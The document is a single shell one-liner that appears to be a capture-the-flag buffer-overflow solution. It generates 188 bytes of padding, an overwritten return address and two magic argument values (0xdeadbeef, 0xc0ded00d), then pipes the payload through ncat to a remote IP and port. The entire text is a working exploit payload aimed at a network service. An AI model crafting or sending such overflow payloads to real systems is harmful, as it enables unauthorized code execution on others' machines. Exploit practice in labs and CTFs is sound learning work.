python -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ncat 178.128.164.188 31229
